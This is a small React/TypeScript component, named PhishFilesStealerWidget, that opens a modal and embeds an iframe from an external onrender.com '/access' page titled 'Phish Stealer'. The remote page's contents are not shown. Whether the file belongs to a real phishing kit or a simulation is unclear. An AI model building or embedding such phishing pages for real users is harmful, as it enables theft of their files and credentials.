import React from 'react';
import './phish-files-stealer-widget.scss';

interface PhishFilesStealerWidgetProps {
  onClose: () => void;
}

export const PhishFilesStealerWidget: React.FC<PhishFilesStealerWidgetProps> = ({ onClose }) => (
  <div className="phish-files-stealer-backdrop" onClick={onClose}>
    <div className="phish-files-stealer-widget" onClick={(e) => e.stopPropagation()}>
      <div className="phish-files-stealer-titlebar">
        <button className="phish-files-stealer-close-btn" onClick={onClose} aria-label="Close" />
      </div>
      <div className="phish-files-stealer-body">
        <iframe
          src="https://app-filenio-b1vckg10be.onrender.com/access"
          className="phish-files-stealer-iframe"
          title="Phish Stealer"
          allowFullScreen
        />
      </div>
    </div>
  </div>
);
